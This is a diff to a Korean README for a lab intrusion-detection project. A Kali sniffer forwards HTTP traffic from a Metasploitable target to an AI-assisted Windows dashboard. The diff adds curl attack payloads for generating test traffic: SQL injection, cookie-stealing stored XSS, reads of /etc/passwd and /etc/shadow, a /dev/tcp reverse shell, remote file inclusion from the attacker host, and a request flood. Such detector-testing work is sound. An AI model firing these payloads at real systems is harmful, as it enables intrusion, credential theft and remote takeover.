@@ -17,6 +17,7 @@ project-root/
 │
 ├── run_kali.py                   ← [Kali] 패킷 수집 에이전트 실행
 ├── run_windows.py                ← [Windows] 서버 + 대시보드 실행
+├── 서버시작.bat                   ← [Windows] 더블클릭 실행용
 │
 ├── _01_kali_agent/               ← [Kali] 패킷 스니핑 및 소켓 전송
 │   ├── __init__.py
@@ -49,15 +50,15 @@ project-root/
 
 ---
 
-## 🖥️ 실행 환경
+## 🖥️ 실행 환경 및 네트워크 구성
 
-| 역할 | OS | 주요 도구 |
-|---|---|---|
-| 공격자 / 패킷 수집 | Kali Linux (VMware) | Python 3, scapy |
-| 공격 대상 | Metasploitable 2 (VMware) | Apache2 (HTTP 서버) |
-| 분석 서버 / 대시보드 | Windows | Python 3, OpenAI API, Gradio |
+| 역할 | OS | IP 주소 | Netmask | Gateway | DNS |
+|---|---|---|---|---|---|
+| 공격자 / 패킷 수집 | Kali Linux (VMware) | 192.168.10.10 | 255.255.255.0 (/24) | 192.168.10.2 | 192.168.10.2 |
+| 공격 대상 | Metasploitable 2 (VMware) | 192.168.10.20 | 255.255.255.0 | 192.168.10.2 | — |
+| 분석 서버 / 대시보드 | Windows 10 | 192.168.10.30 | 255.255.255.0 | 192.168.10.2 | 192.168.10.2 |
 
-> VMware 네트워크는 **VMnet8 (NAT)** 기준으로 세 머신이 같은 네트워크에 있어야 합니다.
+> 세 머신 모두 **VMware VMnet8 (NAT)** 네트워크 `192.168.10.0/24` 에 연결되어야 합니다.
 
 ---
 
@@ -147,7 +148,7 @@ nano .env
 
 **② .env 설정**
 ```env
-SERVER_IP=192.168.x.x      # Windows의 VMnet8 IP (ipconfig로 확인)
+SERVER_IP=192.168.10.30    # Windows IP
 SERVER_PORT=9999
 INTERFACE=eth0             # ip a 명령으로 확인한 인터페이스 이름
 BPF_FILTER=tcp port 80
@@ -168,25 +169,64 @@ sudo venv/bin/python3 run_kali.py
 
 ### 4️⃣ 공격 트래픽 발생
 
-Kali에서 새 터미널을 열고 Metasploitable을 대상으로 트래픽을 전송합니다.
+Kali에서 새 터미널을 열고 Metasploitable(`192.168.10.20`)을 대상으로 공격 트래픽을 전송합니다.
 
 ```bash
-TARGET=192.168.x.x   # Metasploitable IP
+TARGET=192.168.10.20
 
-# 정상 요청
+# ── 정상 요청 ───────────────────────────────────────────────
 curl http://$TARGET/
 
-# SQL Injection
-curl "http://$TARGET/index.php?id=1'+OR+'1'='1"
+# ── SQL Injection ───────────────────────────────────────────
+# 기본 OR 조건 우회
+curl "http://$TARGET/mutillidae/index.php?page=user-info.php&username=admin'+OR+'1'='1&password=&user-info-php-submit-button=View+Account+Details"
 
-# XSS
-curl "http://$TARGET/index.php?name=<script>alert(1)</script>"
+# UNION 기반 컬럼 추출
+curl "http://$TARGET/mutillidae/index.php?page=user-info.php&username=1'+UNION+SELECT+null,null,null,table_name,null+FROM+information_schema.tables--+-"
 
-# Path Traversal
-curl "http://$TARGET/index.php?file=../../../../etc/passwd"
+# Blind SQL Injection (시간 기반)
+curl "http://$TARGET/mutillidae/index.php?page=user-info.php&username=1'+AND+SLEEP(5)--+-"
 
-# Command Injection
-curl "http://$TARGET/index.php?cmd=;cat+/etc/passwd"
+# ── XSS (Cross-Site Scripting) ──────────────────────────────
+# Reflected XSS
+curl "http://$TARGET/mutillidae/index.php?page=dns-lookup.php&target_host=<script>alert(document.cookie)</script>"
+
+# Stored XSS (POST)
+curl -X POST "http://$TARGET/mutillidae/index.php?page=add-to-your-blog.php" \
+  --data "blog_entry=<script>document.location='http://192.168.10.10/steal?c='+document.cookie</script>&add-to-your-blog-php-submit-button=Save+Blog+Entry"
+
+# ── Path Traversal ──────────────────────────────────────────
+# /etc/passwd 읽기
+curl "http://$TARGET/mutillidae/index.php?page=../../../../etc/passwd"
+
+# /etc/shadow 읽기 시도
+curl "http://$TARGET/mutillidae/index.php?page=../../../../etc/shadow"
+
+# ── Command Injection ───────────────────────────────────────
+# ping 명령에 명령 삽입
+curl "http://$TARGET/mutillidae/index.php?page=dns-lookup.php&target_host=127.0.0.1;cat+/etc/passwd"
+
+# 리버스 쉘 시도
+curl "http://$TARGET/mutillidae/index.php?page=dns-lookup.php&target_host=127.0.0.1;bash+-i+>&+/dev/tcp/192.168.10.10/4444+0>&1"
+
+# ── File Inclusion ──────────────────────────────────────────
+# Local File Inclusion
+curl "http://$TARGET/mutillidae/index.php?page=/etc/passwd%00"
+
+# Remote File Inclusion
+curl "http://$TARGET/mutillidae/index.php?page=http://192.168.10.10/malicious.php"
+
+# ── LDAP Injection ──────────────────────────────────────────
+curl "http://$TARGET/mutillidae/index.php?page=user-info.php&username=admin)(%26(objectClass=*"
+
+# ── HTTP Response Splitting ─────────────────────────────────
+curl "http://$TARGET/index.php?redirect=http://evil.com%0d%0aSet-Cookie:+session=hijacked"
+
+# ── 대량 요청 (DoS 시뮬레이션) ─────────────────────────────
+for i in {1..20}; do
+  curl -s "http://$TARGET/?id=$i'+OR+'1'='1" > /dev/null
+  echo "[$i/20] 전송됨"
+done
 ```
 
 > Windows 대시보드(http://localhost:7860)에서 실시간 분석 결과를 확인합니다.
@@ -206,7 +246,8 @@ curl "http://$TARGET/index.php?cmd=;cat+/etc/passwd"
 ## 🔄 시스템 흐름
 
 ```
-[Metasploitable]      [Kali Linux]               [Windows]
+[Metasploitable]      [Kali Linux]               [Windows 10]
+192.168.10.20         192.168.10.10              192.168.10.30
 Apache 웹서버  →  scapy 패킷 캡처           소켓 수신 (:9999)
                   HTTP 페이로드 추출    →   전처리 (URL 디코딩)
                   JSON 직렬화                      ↓
